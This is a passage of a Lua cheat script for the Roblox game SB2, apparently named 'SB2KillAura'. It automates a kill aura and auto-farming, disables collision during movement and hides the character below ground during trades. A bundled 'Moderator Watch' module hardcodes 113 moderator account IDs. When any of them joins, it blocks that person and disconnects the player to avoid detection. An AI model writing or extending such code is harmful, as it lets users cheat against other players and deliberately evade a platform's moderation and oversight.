        local target=state.FollowTarget or state.AttackingTarget
        local dodge=state.AtheonDodgeController
        local observation={At=os.clock(),Before=before,After=guardLastValue,Target=target and target.Name,
            Position=root and root.Position,Offset=state.TeleportOffset,Mode=state.OffsetMode or "Below",Dodging=state.Dodging,
            DodgeReason=dodge and dodge.LastReason,Anchor=dodge and dodge.Anchor,Planned=waveDodge.LastPosition}
        local history=state.DamageHistory or {};state.DamageHistory=history
        history[#history+1]=observation;while #history>8 do table.remove(history,1)end
        state.LastDamageEvent=observation;state.LastIncomingDamageAt=observation.At
    end)
end
function state.Destroy(replacing,teleportCleanup)
    if state.Destroying or not state.Running then return end
    state.Destroying=true
    local search=state.SoloServerSearch
    local preserveSearch=teleportCleanup==true and(state.AutomationTeleporting
        or((state.SafeMode or state.MultiSpot or state.AccountProgression)and state.ServerTeleportStarted)
        or(search and search.Active and search.Phase=="Teleporting"))
    local scope=(function()
-- BEGIN BUNDLED RUNTIME SCOPE
-- Detach callbacks before invoking them so nested shutdown cannot run twice.
return function()
    local scope={Errors={}}
    local callbacks,labels={},{}
    local open=true
    function scope.Add(label,callback)
        assert(open,"Runtime scope already closed")
        assert(type(callback)=="function","Cleanup must be callable")
        callbacks[#callbacks+1]=callback;labels[#labels+1]=label
    end
    function scope.Close()
        if open then
            open=false
            local pending=callbacks;callbacks={}
            for index=1,#pending do
                local callback=pending[index];pending[index]=nil
                local ok,reason=pcall(callback)
                if not ok then scope.Errors[#scope.Errors+1]={Name=labels[index],Error=tostring(reason)}end
                labels[index]=nil
            end
        end
        return scope.Errors
    end
    return scope
end

-- END BUNDLED RUNTIME SCOPE
    end)()()
    local function add(name,callback)scope.Add(name,callback)end
    local function method(name,object,member,...)
        if object and type(object[member])=="function"then
            local arguments=table.pack(...)
            add(name,function()object[member](table.unpack(arguments,1,arguments.n))end)
        end
    end
    local function owned(name,object)method(name,object,"Destroy")end
    add("Save",function()if configReady and not preserveSearch then state.SaveNow()end end)
    add("Stop",function()state.Running=false;state.Enabled=false;state.AutoFarm=false;state.SkillAura=false end)
    add("Startup hold",function()if releaseStartupHold then releaseStartupHold(true)end end)
    owned("Block dialog visuals",state.BlockDialogMask)
    owned("SelfDamage",state.SelfDamageProtection)
    method("Ownership",runtimeOwner,"Release")
    owned("UI",state.WindUI);owned("AntiAFK",state.AntiAfk)
    method("Search",search,"Destroy",preserveSearch)
    if not preserveSearch then owned("Safe",state.SafeController)end
    owned("MultiSpot",state.MultiSpotController)
    local callbacks={
        {"Progression",function()if state.ProgressionDestroy then state.ProgressionDestroy()end end},
        {"Skills",function()if state.CancelSkillAura then state.CancelSkillAura("Script replaced")end end},
        {"Weapons",function()if state.WeaponSkillsDestroy then state.WeaponSkillsDestroy()end end},
        {"Sword",function()stopSword(true)end},
        {"Support",function()if state.CancelMiscSkill then state.CancelMiscSkill()end end},
        {"World",function()if state.RestoreWorldVisuals then state.RestoreWorldVisuals()end end},
        {"DamageHook",function()if state.RestoreSkillDamageHook then state.RestoreSkillDamageHook()end end},
        {"Observation",function()if state.FinishSkillObservation then state.FinishSkillObservation()end end},
        {"HealthObserver",function()if guardConnection then guardConnection:Disconnect();guardConnection=nil end end},
        {"Movement",function()stopMovement(nil,replacing==true)end},
    }
    for _,entry in ipairs(callbacks)do add(entry[1],entry[2])end
    for _,entry in ipairs({{"Performance",state.PerformanceBoost},{"Players",state.PlayerTools},{"Moderator",state.ModeratorWatch},
        {"Upright",state.UprightController},{"Dodge",waveDodge},{"Visuals",state.SkillVisuals},{"Attacks",normalScheduler},
        {"Collision",state.FarmNoclip},{"Recovery",state.RuntimeRecovery},{"Touch",state.AuraTouch},
        {"SpotHUD",state.MultiSpotHUD},{"HealthHUD",healthHUD},{"Scheduler",state.WorkScheduler},{"Enemies",state.EnemyRegistry}})do owned(entry[1],entry[2])end
    method("Activation",state.SkillActivation,"Release")
    add("Connections",function()
        for index=#connections,1,-1 do local connection=connections[index];connections[index]=nil;pcall(connection.Disconnect,connection)end
    end)
    add("Root",function()if gui then gui:Destroy()end end)
    add("Singleton",function()if env.SB2KillAura==state then env.SB2KillAura=nil end end)
    state.CleanupErrors=scope.Close()
end
bind(toggle.Activated,function()state.SetEnabled(not state.Enabled)end)
bind(gui.Destroying,function()state.Destroy(false,true)end)
local walkKeys={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,[Enum.KeyCode.Space]=true}
bind(UserInputService.InputBegan,function(input,processed)
    if processed or UserInputService:GetFocusedTextBox()then return end
    if state.TravelHold and not(state.AutoFarm and state.Enabled)and walkKeys[input.KeyCode]then stopMovement("Travel hold released")end
    if input.KeyCode==Enum.KeyCode.RightShift then state.SetUIVisible(state.UIHidden)end
end)
bind(RunService.Stepped,function()
    if not state.Moving then return end
    for part in pairs(collisionParts)do if part.Parent and part.CanCollide then part.CanCollide=false end end
end)
do
    local rangeFactory=(function()
-- BEGIN BUNDLED AUTO RANGE
-- Range learning is isolated by enemy data, attack mode, skill, and farming side.
return function(ctx)
    local api={Cap=120,Profiles=setmetatable({}, {__mode="k"})}
    local state=ctx.State
    local clock=ctx.Clock or os.clock
    local due=0
    state.AutoRangeCap=api.Cap
    function api.BodyRange(data)return math.min(api.Cap,math.max(data.Root.Size.X,data.Root.Size.Z)*.5+20)end
    function api.Delta(data,root)
        local center=data.Root.Position+Vector3.new(0,(root.Size.Y-data.Root.Size.Y)*.5,0)
        local mover=data.Motion
        if mover and mover.Parent==data.Root then
            local velocity=mover:IsA("LinearVelocity")and mover.VectorVelocity or mover:IsA("BodyVelocity")and mover.Velocity
            if velocity and velocity.Magnitude>1 then center+=velocity.Unit end
        end
        return center-root.Position
    end
    local function entry(kind,data,skill)
        local group=api.Profiles[data]
        if not group then group={};api.Profiles[data]=group end
        local key=kind=="Skill"and "Skill:"..tostring(skill or state.SelectedSkill)or "Kill"
        if state.AutoFarm and state.FarmAbove then key="Above:"..key end
        local value=group[key]
        if not value or value.Size~=data.Root.Size then
            value={Size=data.Root.Size,Limit=api.BodyRange(data),Samples={},NextProbe=0};group[key]=value
        end
        return value
    end
    function api.Range(kind,data,skill)
        local profile=entry(kind,data,skill)
        local time=clock();local maximum=api.BodyRange(data)
        if profile.Limit<maximum and time>=profile.NextProbe then
            if time-(profile.LastSample or 0)>12 then profile.Limit=maximum
            elseif profile.LastHit and time-profile.LastHit<6 then profile.Limit=math.min(maximum,profile.Limit+1)end
            profile.NextProbe=time+6
        end
        return math.min(maximum,profile.Limit)
    end
    local function statistics(samples,time)
        local hits,misses,farthest,nearest=0,0,0,math.huge
        for i=#samples,1,-1 do
            local sample=samples[i]
            if time-sample.At>12 then table.remove(samples,i)
            elseif sample.Damage>0 then hits+=1;farthest=math.max(farthest,sample.Distance)
            else misses+=1;nearest=math.min(nearest,sample.Distance)end
        end
        return hits,misses,farthest,nearest
    end
    function api.Record(kind,distance,damage,data,skill)
        if not data or (kind~="Kill"and kind~="Skill")or type(distance)~="number"or distance~=distance or distance<0 or distance>api.Cap then return end
        local profile=entry(kind,data,skill);local time=clock()
        profile.LastSample=time
        if type(damage)=="number"and damage>0 then profile.LastHit=time end
        local samples=profile.Samples
        if #samples==12 then table.remove(samples,1)end
        samples[#samples+1]={At=time,Distance=distance,Damage=damage or 0}
        local hits,misses,farthest,nearest=statistics(samples,time)
        local limit=api.Range(kind,data,skill)
        if hits>0 then limit=math.min(api.BodyRange(data),math.max(limit,farthest+1))end
        if nearest>=limit-3 then
            if hits>0 and misses>=2 and nearest>farthest+2 then limit=math.min(limit,math.max(20,math.ceil(farthest+2)))
            elseif hits==0 and misses>=3 then limit=math.max(20,limit-2)end
        end
        if profile.Limit~=limit then profile.Limit=limit;profile.NextProbe=time+6 end
    end
    local function present(kind,data)
        local current=kind=="Kill"and state.Radius or state.SkillRange
        local effective=data and api.Range(kind,data,state.SelectedSkill)or math.clamp(current,20,api.Cap)
        local value=math.ceil(effective)
        if value~=current then if kind=="Kill"then ctx.SetKill(value)else ctx.SetSkill(value)end end
        state[kind=="Kill"and "KillRangeStatus"or "SkillRangeStatus"]=string.format("Auto · %.1f / %d studs",effective,api.Cap)
    end
    function api.Update(now)
        now=now or clock()
        if now<due then return end
        due=now+.5
        local data=ctx.PrimaryData and ctx.PrimaryData()
        present("Kill",data);present("Skill",data)
    end
    return api
end

-- END BUNDLED AUTO RANGE
    end)()
    state.AutoRanges=rangeFactory({State=state,SetKill=state.SetRadius,SetSkill=state.SetSkillRange,
        PrimaryData=function()
            local target=state.AutoFarm and state.FollowTarget or state.AttackingTarget
            local data=target and getMobData(target)
            if data and data.Health.Value>0 then return data end
        end})
end
local function noteAttack(mob,kind,skill)
    state.LastEnemyAttackAt=os.clock();state.LastEnemyAttackTarget=mob;state.LastEnemyAttackKind=kind
    state.LastEnemyAttackSkill=skill
end
normalScheduler.Bind({GetData=function(mob)
        if not validMob(mob,indexedMobFolder)then return nil end
        local data=getMobData(mob)
        if data and os.clock()>=(data.SkipUntil or 0)then return data end
    end,Contribution=state.ReadOwnDamage,Radius=attackRadiusFor,Delta=attackDeltaFor,
    Damage=function(mob)
        if state.BetweenPaceHolding then return false end
        local data=getMobData(mob)
        if state.BlackoutHolding and (mob~=state.SkillRegistrationTarget or state.ReadOwnDamage(data.Health)~=nil)then return false end
        if state.CreditController and not state.CreditController.AllowAction(mob,data,"Normal")then return false end
        if state.FinishSkillObservation then state.FinishSkillObservation()end
        local sample=pendingDamage[mob]
        if not sample then
            local amount,tag=state.ReadOwnDamage(data.Health)
            sample={Health=data.Health,Before=data.Health.Value,Time=os.clock(),Requests=0,
                Distance=attackDeltaFor(data,player.Character.HumanoidRootPart).Magnitude,Contribution=amount,Counter=tag,SkillRequests=state.SkillHitRequests}
            pendingDamage[mob]=sample
        end
        if state.MultiSpotEncounter and(not state.MultiSpotPriorityActive or state.MultiSpotEncounter[mob])then state.MultiSpotEncounter[mob]=true end
        if state.CreditController then state.CreditController.Sent(mob,data,"Normal")end
        Combat.DealDamage(mob,nil);noteAttack(mob,"Normal")
    end,Visual=playBurstSwing,
    Sent=function(mob,data,now)
        local sample=pendingDamage[mob];if sample then sample.Requests+=1 end
        data.OffsetRequests=(data.OffsetRequests or 0)+1
        state.LastPulseAt=now;state.HitsSent+=1;state.LastTarget=mob.Name;state.AttackingTarget=mob;lastHit[mob]=now
        healthHUD.Touch(mob);trackHealth(state.AutoFarm and state.FollowTarget or mob)
    end})
local function processNormalObservations(now,mobs,root)
    for mob,sample in pairs(pendingDamage)do
        if now>=sample.Time+.7 then
            pendingDamage[mob]=nil
            local credited=state.ReadOwnDamage(sample.Health,sample.Counter)
            local amount=credited~=nil and math.max(0,credited-(sample.Contribution or 0))or math.max(0,sample.Before-sample.Health.Value)
            local data=sample.Health.Parent and mob.Parent==mobs and getMobData(mob)
            if data then
                local pure=sample.SkillRequests==state.SkillHitRequests
                local comparable=amount>0 or(sample.Health.Value>0 and math.abs(attackDeltaFor(data,root).Magnitude-sample.Distance)<4)
                if pure and credited~=nil and comparable and state.AutoRanges then
                    state.AutoRanges.Record("Kill",sample.Distance,amount,data)
                    if amount>0 and sample.Requests>0 then
                        local perHit=amount/sample.Requests;data.NormalDamagePerHit=data.NormalDamagePerHit and(data.NormalDamagePerHit+perHit)*.5 or perHit
                    end
                end
                if amount>0 then
                    data.RegisteredDamage=true;data.AttackMisses=0;data.AttackBackoff=math.max(1,(data.AttackBackoff or 1)*.5)
                else
                    data.AttackMisses=(data.AttackMisses or 0)+1
                    if data.AttackMisses>=2 then data.AttackMisses=0;data.AttackBackoff=math.min(4,(data.AttackBackoff or 1)*2)end
                end
            end
        end
    end
end

local function scan()
    if state.BetweenPaceHolding then return "Between · waiting for completion pace" end
    local now=os.clock()
    if state.Dodging or now<(state.FarmPauseUntil or 0)then finishAttackBurst("Dodging or repositioning");return end
    if state.BlackoutHolding and not state.SkillRegistrationTarget then finishAttackBurst("Blackout · skill damage only");return end
    local character=player.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    local entity=character and character:FindFirstChild("Entity")
    local health=entity and entity:FindFirstChild("Health")
    local mobs=refreshMobIndex()
    if not(root and health and health.Value>0 and mobs)then stopSword();return "Waiting for character"end
    if not state.Enabled and not state.SkillRegistrationTarget then stopSword();return "Paused"end
    if now<state.LagPauseUntil or(state.PingMs and state.PingMs>500)then stopSword();return "Paused · waiting for lag to clear"end
    if state.Recovering then stopSword();return "Returning to ground…"end
    if state.SkillPreparing or state.SkillCastRunning or now<(state.CombatReadyAt or 0)then stopSword();return "Skill aura · skill hit window"end
    if character:GetAttribute("Disabled")then stopSword();return "Paused · character disabled"end
    stopSword()
    if swingThread or Actions.IsSwinging()then return "Finishing sword swing"end
    local primary=state.AutoFarm and state.FollowTarget or nil
    local revision=state.EnemyRegistry and state.EnemyRegistry.Revision
    if now>=nextTargetRefresh or candidatePrimary~=primary or state.CombatCandidateRevision~=revision then
        candidatePrimary=primary;state.CombatCandidateRevision=revision;nextTargetRefresh=now+.22
        table.clear(candidates);state.NearestKillExcluded=nil
        for mob in pairs(trackedMobs)do
            local data=mob.Parent==mobs and getMobData(mob)
            if data and data.Health.Value>0 and not data.Entity:FindFirstChild("Immortal")then
                local delta=attackDeltaFor(data,root);local radius=attackRadiusFor(mob)
                if delta:Dot(delta)<=radius*radius then candidates[#candidates+1]=mob end
            end
        end
        table.sort(candidates,function(a,b)return targetPriority.Less(a,b,root.Position,primary)end)
    end
    state.Nearby=#candidates
    processNormalObservations(now,mobs,root)
    return normalScheduler.Update(now,candidates,root,mobs)
end
-- Runtime work is declared once; each job owns its pace and failure history.
local frameTiming=(function()
-- BEGIN BUNDLED FRAME TIMING
-- Exponential timing baseline with a separate, bounded hitch hold.
return function(state)
    local smoothing, ceiling = .08, .2
    local function finitePositive(value)
        return type(value)=="number" and value>0 and value<math.huge and value==value
    end
    return {Sample=function(elapsed,stamp)
        if not finitePositive(elapsed)then return nil end
        local baseline=state.AverageFrameTime or 1/60
        local hitch=elapsed>math.max(.35,baseline*4)
        state.AverageFrameTime=baseline*(1-smoothing)+math.min(ceiling,elapsed)*smoothing
        if hitch and (state.Enabled or state.SkillAura)then
            local hold=stamp+.5
            if hold>(state.LagPauseUntil or 0)then state.LagPauseUntil=hold end
        end
        return hitch
    end}
end

-- END BUNDLED FRAME TIMING
end)()(state)
state.PerformanceBudget=(function()
-- BEGIN BUNDLED PERFORMANCE BUDGET
-- Pressure tiers have independent release times to prevent budget oscillation.
return function(state)
    local deadline={Poll=0,Limited=0,Severe=0}
    local budgets={{4,48},{2,24},{1,12}}
    local api={}
    function api.Update(stamp)
        stamp=stamp or os.clock()
        if stamp<deadline.Poll then return end
        deadline.Poll=stamp+1
        local loop=state.AverageLoopCost or 0
        local ping=state.PingMs or 0
        local tier=((state.AverageFrameTime or 1/60)>1/45 or ping>300 or loop>.002)and 2 or 1
        if ping>500 or loop>.006 then tier=3 end
        if tier>=2 then deadline.Limited=stamp+3 end
        if tier==3 then deadline.Severe=stamp+3 end
        local active=stamp<deadline.Severe and 3 or (stamp<deadline.Limited and 2 or 1)
        state.FrameRequestCap=budgets[active][1]
        state.MaxRequestsPerSecond=budgets[active][2]
        state.NetworkPressureLimited=active>1
    end
    api.Update()
    return api
end

-- END BUNDLED PERFORMANCE BUDGET
end)()(state)
do
    local attach=(function()
-- BEGIN BUNDLED TRADE HOLD
return function(ctx)
    local api={}
    local lease
    function api.Update()
        if ctx.Blocked() then lease=nil;return end
        if not ctx.Active() then
            local release=lease~=nil
            lease=nil
            if release then ctx.Release()end
            return
        end
        local root=ctx.Root()
        if not lease or lease.root~=root then
            lease={root=root,point=root and ctx.Anchor(root)}
            ctx.Pause()
        end
        if lease.root and lease.point then ctx.Hold(lease.point)end
    end
    return api
end

-- END BUNDLED TRADE HOLD
    end)()
    state.TradeHold=attach({Active=function()return state.AutoTradeBusy==true end,
        Blocked=function()return state.StopEverything or state.ModeratorBlocking or state.SafeModePanic or state.AutoJoinFriendHolding or state.AutomationTeleporting end,
        Root=function()
            local character=player.Character;local humanoid=character and character:FindFirstChildOfClass("Humanoid")
            return humanoid and humanoid.Health>0 and character:FindFirstChild("HumanoidRootPart")or nil
        end,
        Anchor=function(root)local point=root.Position;return Vector3.new(point.X,waveDodge.FloorY(point),point.Z)end,
        Hold=function(anchor)waveDodge.Idle(anchor)end,
        Pause=function()
            state.TravelSerial=(state.TravelSerial or 0)+1;state.TravelBusy=false;state.FollowTarget=nil
            finishAttackBurst("Trading");stopSword(true)
            if state.CancelSkillAura then state.CancelSkillAura("Trading")end
            if state.CancelMiscSkill then state.CancelMiscSkill()end
            if state.MultiSpotController then state.MultiSpotController.Reset()end
            if state.ProgressionController then state.ProgressionController.Reset()end
            stopMovement("Trading · holding 20 studs below ground",true)
        end,
        Release=function()nextMovementUpdate=0;nextAcquisition=0;stopMovement("Trade ended · resuming farming",true)end})
end
local scheduleFactory=(function()
-- BEGIN BUNDLED WORK SCHEDULER
-- Jobs own independent deadlines, diagnostics and retry state.
return function(context)
    local api={Tasks={},Failures=0}
    local open=true
    local function period(job)
        local value=job.Interval
        if type(value)=="function"then value=value()end
        assert(type(value)=="number"and value>=0 and value<math.huge,"Invalid task interval")
        return value
    end
    function api.Add(name,interval,callback,options)
        assert(open,"Scheduler already closed")
        assert(type(callback)=="function"and not api.Tasks[name],"Invalid or duplicate task")
        local job={Name=name,Interval=interval,Run=callback,Options=options or {},Due=0,Calls=0,Failures=0,ConsecutiveFailures=0}
        period(job);api.Tasks[name]=job;return job
    end
    function api.Wake(name)
        local job=open and api.Tasks[name]
        if job then job.Due=0 end
    end
    function api.Step(name,timestamp,...)
        if not open then return end
        local job=assert(api.Tasks[name],"Unknown task: "..tostring(name))
        local at=timestamp or context.Now()
        if at<job.Due then return end
        job.Due=at+period(job)
        if job.Options.Enabled and not job.Options.Enabled()then return end
        local started=context.Now();job.Calls+=1;job.LastRun=at
        local ok,result=pcall(job.Run,at,...)
        job.Cost=math.max(0,context.Now()-started)
        if ok then job.LastError=nil;job.ConsecutiveFailures=0
        else
            local attempt=job.ConsecutiveFailures+1
            job.Failures+=1;job.ConsecutiveFailures=attempt;api.Failures+=1
            job.LastError=tostring(result);job.Due=at+math.min(2,.1*2^math.min(4,attempt-1))
            if context.Error then
                local handled,reason=pcall(context.Error,name,job.LastError,job)
                if not handled then job.RecoveryError=tostring(reason)end
            end
        end
        return ok,result
    end
    function api.Destroy()
        if not open then return end
        open=false
        for _,job in pairs(api.Tasks)do job.Run=nil;job.Options=nil end
        table.clear(api.Tasks)
    end
    return api
end

-- END BUNDLED WORK SCHEDULER
end)()
local function taskFailure(name,reason)
    state["Last"..name.."Error"]=reason
    if name=="Movement"then state.FarmPauseUntil=os.clock()+1;state.FollowTarget=nil;movementStatus("Recovering movement · retrying")end
    if name=="Skill"then state.SkillRetryAt=os.clock()+1.5;state.SkillStatus="Skill retry · waiting for game state"end
    if name=="MiscSkill"then state.MiscReserveStamina=false end
end
local workScheduler=scheduleFactory({Now=os.clock,Error=taskFailure})
state.WorkScheduler=workScheduler
local function optional(key,method)
    return function(now)local controller=state[key];if controller then return controller[method](now)end end
end
local jobs={
    {"TradeHold",.05,optional("TradeHold","Update")},
    {"AuraTouch",.1,optional("AuraTouch","Update")},
    {"Float",.1,optional("ArenaFloat","Update")},
    {"Performance",1,optional("PerformanceBudget","Update")},
    {"Gear",.5,function(now)if state.UpdateBestSword then state.UpdateBestSword(now)end end},
    {"Weapon",.25,optional("WeaponSkills","Update")},
    {"Swing",.05,function()updateAutoSwing()end},
    {"Dodge",.03,function()waveDodge.Update()end},
    {"HealthGuard",.5,updateHealthGuard},
    {"HealthHUD",.12,function(now)healthHUD.Update(now)end},
    {"Ranges",.5,optional("AutoRanges","Update")},
    {"Visual",.08,optional("SkillVisuals","Update")},
    {"Discovery",5,function()discoverDestinations(true)end},
    {"Movement",.08,updateMovement},
    {"Upright",.08,optional("UprightController","Update")},
    {"MiscSkill",.1,optional("MiscController","Update")},
    {"Skill",0,function()updateSkillAura()end},
    {"Combat",.03,function()return scan()end},
}
local frameOrder={}
local function taskController(name,interval,callback)
    workScheduler.Add(name,interval,callback)
end
for _,job in ipairs(jobs)do workScheduler.Add(job[1],job[2],job[3])end
local function priorityOnly()
    if state.ModeratorBlocking or state.AutoJoinFriendHolding then
        if state.PanicToSpawn then state.PanicToSpawn()end
        return true
    end
    if state.SafeModePanic then
        if state.SafePanicHoldHere then state.PanicInPlace()else state.PanicToSpawn()end
        return true
    end
    return state.AutoTradeBusy==true
end
local function runFrame()
    local at=os.clock()
    workScheduler.Step("TradeHold",at);workScheduler.Step("AuraTouch",at)
    if state.StopEverything or priorityOnly()then return end
    for _,name in ipairs(frameOrder)do if state.Running then workScheduler.Step(name,at)end end
    for index=3,#jobs do
        if not state.Running then return end
        local name=jobs[index][1]
        local ok,result=workScheduler.Step(name,at)
        if name=="Combat"and ok~=nil then
            if ok then consecutiveErrors=0;state.LastError=nil;combatStatus=result
            else
                consecutiveErrors+=1;state.LastError=tostring(result);state.Backoff=math.min(8,state.Backoff*2)
                if consecutiveErrors>=3 then consecutiveErrors=0;state.FarmPauseUntil=at+1;combatStatus="Recovering combat · auto farm stays enabled";stopSword()end
            end
        end
    end
    local elapsed=os.clock()-at
    state.AverageLoopCost=state.AverageLoopCost+(elapsed-state.AverageLoopCost)*.08
end
do
    local attach=(function()
-- BEGIN BUNDLED RUNTIME RECOVERY
-- Expired work is cancelled before a replacement is allowed to execute.
return function(context)
    local state=context.State
    local recovery={}
    local current,closed
    local function priorityWait()
        for _,name in ipairs({"StopEverything","SafeModePanic","ModeratorBlocking","AutomationTeleporting","AutoTradeBusy"})do
            if state[name]then return true end
        end
        return false
    end
    local function record(kind,now)
        local count=kind.."Recoveries"
        state[count]=(state[count]or 0)+1
        state["Last"..kind.."RecoveryAt"]=now
    end
    function recovery.CheckTravel(now)
        if closed or priorityWait()then return end
        if state.TravelBusy and state.TravelStartedAt and now>=state.TravelStartedAt+20 then
            context.RecoverTravel(state.TravelSerial);record("Travel",now)
        end
    end
    function recovery.CheckPending(now)
        recovery.CheckTravel(now)
        if closed or priorityWait()then return end
        local cast=state.ActiveSkillCast
        if not(state.SkillCastRunning and cast and cast.RecoveryDeadline)then return end
        if now>=cast.RecoveryDeadline then context.RecoverSkill();record("Skill",now)end
    end
    local function expire(now)
        if current==nil then return true end
        if priorityWait()or now<current.Expires or now<current.Retry then return false end
        current.Retry=now+5
        local ok,answer=pcall(context.Cancel,current.Thread)
        if not ok or answer==false then
            state.LastCoordinatorError="Stalled frame cancellation failed; waiting for its engine call"
            return false
        end
        current=nil;record("Coordinator",now)
        local restored,reason=pcall(context.RecoverFrame)
        if not restored then state.LastCoordinatorError=tostring(reason)end
        return true
    end
    function recovery.Run(callback)
        if closed then return end
        local at=context.Now()
        if not expire(at)then return end
        local token={Thread=context.Thread(),Expires=at+8,Retry=0}
        current=token;state.FrameStartedAt=at
        local ok,result=pcall(callback)
        if current==token then current=nil;state.FrameCompletedAt=context.Now()end
        return ok,result
    end
    function recovery.Destroy()
        if closed then return end
        closed=true
        local caller=context.Thread()
        local workers={current and current.Thread,state.TravelWorker}
        current=nil;state.TravelWorker=nil;state.TravelStartedAt=nil
        for _,worker in pairs(workers)do if worker~=caller then pcall(context.Cancel,worker)end end
    end
    return recovery
end

-- END BUNDLED RUNTIME RECOVERY
    end)()
    local function recoverFrame()
        state.CancelSkillAura("Recovering stalled update");stopMovement("Recovering stalled update",true)
        state.FollowTarget=nil;state.FarmTargetLock=nil
        nextTargetRefresh=0;nextMovementUpdate=0;nextAcquisition=0;state.FarmPauseUntil=os.clock()+.5
    end
    local function recoverTravel(serial)
        if serial~=state.TravelSerial then return end
        state.TravelSerial=serial+1
        local worker=state.TravelWorker
        state.TravelWorker=nil;state.TravelStartedAt=nil;state.TravelBusy=false;state.MultiSpotTravelPending=false
        state.LastTravelDestination=nil;state.LastTravelPosition=nil
        if worker then pcall(task.cancel,worker)end
        state.TravelError="Arena travel timed out · retrying without restarting"
        stopMovement(state.TravelError,true);setTravelStatus(state.TravelError)
    end
    state.RuntimeRecovery=attach({State=state,Now=os.clock,Thread=coroutine.running,
        Cancel=function(worker)task.cancel(worker);return true end,RecoverFrame=recoverFrame,RecoverTravel=recoverTravel,
        RecoverSkill=function()
            state.CancelSkillAura("Recovering stalled skill activation")
            state.SkillRetryAt=os.clock()+1;state.SkillStatus="Skill timed out · retrying automatically"
        end})
    local credit,lastWarning=0,0
    bind(RunService.Heartbeat,function(delta)
        local now=os.clock();frameTiming.Sample(delta,now)
        if not state.Running or state.StopEverything or state.AntiSuspiciousRestUntil or not gui.Parent then return end
        state.RuntimeRecovery.CheckPending(now)
        credit+=delta
        local period
        if state.SafeModePanic then period=.1
        elseif state.Enabled or state.SkillAura then period=1/60
        elseif state.AutoDodge and workspace:FindFirstChild("WaveDefenseStuff")then period=.04
        else period=.1 end
        if credit+.0005<period then return end
        credit=math.min(period,math.max(0,credit-period))
        local ok,reason=state.RuntimeRecovery.Run(runFrame)
        if ok==false then
            state.LastCoordinatorError=tostring(reason);state.FarmPauseUntil=now+.5
            if now-lastWarning>5 then lastWarning=now;warn("[SB2 Coordinator] "..tostring(reason))end
        end
    end)
end
-- Restore feature intent only after every combat controller has registered its API.
state.SetAutoSwing(restore.AutoSwing)
state.SetEnabled(restore.Enabled)
if restore.AutoFarm then
    state.SetAutoFarm(true)
    if not restore.Enabled then state.SetEnabled(false)end
end
state.SetSkillAura(restore.SkillAura)
configReady=true
state.SaveNow()
do
    local makeWatch=(function()
-- BEGIN BUNDLED MODERATOR WATCH
-- Account IDs from the moderator list explicitly supplied by the user.
return function(ctx)
    local ids={
        [12671]=true,
        [4402987]=true,
        [7858636]=true,
        [13444058]=true,
        [24156180]=true,
        [35311411]=true,
        [38559058]=true,
        [45035796]=true,
        [48662268]=true,
        [50879012]=true,
        [51696441]=true,
        [55715138]=true,
        [57436909]=true,
        [59341698]=true,
        [60673083]=true,
        [62240513]=true,
        [66489540]=true,
        [68210875]=true,
        [72480719]=true,
        [75043989]=true,
        [76999375]=true,
        [81113783]=true,
        [90258662]=true,
        [93988508]=true,
        [101291900]=true,
        [102706901]=true,
        [104541778]=true,
        [109105759]=true,
        [111051084]=true,
        [121104177]=true,
        [129806297]=true,
        [151751026]=true,
        [154847513]=true,
        [154876159]=true,
        [161577703]=true,
        [161949719]=true,
        [163733925]=true,
        [167655046]=true,
        [167856414]=true,
        [173116569]=true,
        [184366742]=true,
        [194755784]=true,
        [220726786]=true,
        [225179429]=true,
        [269112100]=true,
        [271388254]=true,
        [309775741]=true,
        [349854657]=true,
        [354326302]=true,
        [357870914]=true,
        [358748060]=true,
        [367879806]=true,
        [371108489]=true,
        [373676463]=true,
        [429690599]=true,
        [434696913]=true,
        [440458342]=true,
        [448343431]=true,
        [454205259]=true,
        [455293249]=true,
        [461121215]=true,
        [478848349]=true,
        [500009807]=true,
        [533787513]=true,
        [542470517]=true,
        [571218846]=true,
        [575623917]=true,
        [630696850]=true,
        [810458354]=true,
        [852819491]=true,
        [874771971]=true,
        [918971121]=true,
        [1033291447]=true,
        [1033291716]=true,
        [1058240421]=true,
        [1099119770]=true,
        [1114937945]=true,
        [1190978597]=true,
        [1266604023]=true,
        [1379309318]=true,
        [1390415574]=true,
        [1416070243]=true,
        [1584345084]=true,
        [1607227678]=true,
        [1648776562]=true,
        [1650372835]=true,
        [1666720713]=true,
        [1728535349]=true,
        [1785469599]=true,
        [1794965093]=true,
        [1801714748]=true,
        [1868318363]=true,
        [1998442044]=true,
        [2034822362]=true,
        [2216826820]=true,
        [2324028828]=true,
        [2462374233]=true,
        [2787915712]=true,
        [360470140]=true,
        [2475151189]=true,
        [3522932153]=true,
        [3772282131]=true,
        [7557087747]=true,
        [5536587740]=true,
        [3931735673]=true,
        [33903799]=true,
        [22026533]=true,
        [417576199]=true,
        [80692318]=true,
        [102583875]=true,
        [492574273]=true,
        [468344010]=true,
        [1560324163]=true,
    }
    local api={Enabled=true,Count=113}
    local lifecycle={closed=false,claimed=false}
    local function publish(message)
        api.Status=message
        ctx.State.ModeratorStatus=message
        if ctx.Notify then pcall(ctx.Notify,message)end
    end
    local function current()
        return not lifecycle.closed and ctx.State.Running~=false and not ctx.State.StopEverything
    end
    local function confirmedExit(person)
        if not current()then return end
        local ok,receipt=pcall(function()
            assert(type(ctx.Block)=="function","Native block handler is unavailable")
            return ctx.Block(person,current)
        end)
        if not current()then return end
        if not ok or receipt~=true then
            api.Failed=true
            ctx.State.ModeratorBlockError=ok and "Roblox did not confirm the moderator block"or tostring(receipt)
            publish("Moderator block failed · automation paused · "..ctx.State.ModeratorBlockError)
            return
        end
        ctx.State.ModeratorBlockConfirmed=true
        ctx.State.ModeratorBlockError=nil
        publish("Moderator blocked · disconnecting")
        if ctx.Save then pcall(ctx.Save)end
        if current()then ctx.Kick("Blocked moderator "..person.Name.." ("..person.UserId.."). Disconnected automatically.")end
    end
    local function observe(person)
        if not current()or lifecycle.claimed or person.UserId==ctx.Players.LocalPlayer.UserId or not ids[person.UserId]then return end
        lifecycle.claimed=true
        ctx.State.ModeratorDetected={Name=person.Name,UserId=person.UserId,At=os.time()}
        ctx.State.ModeratorBlocking=true
        publish("Moderator detected · blocking @"..person.Name.." before disconnect")
        if ctx.Pause then pcall(ctx.Pause,person)end
        if ctx.Save then pcall(ctx.Save)end
        task.defer(confirmedExit,person)
    end
    local subscription=ctx.Players.PlayerAdded:Connect(observe)
    local population=ctx.Players:GetPlayers()
    for index=1,#population do task.defer(observe,population[index])end
    function api.Destroy()
        if lifecycle.closed then return end
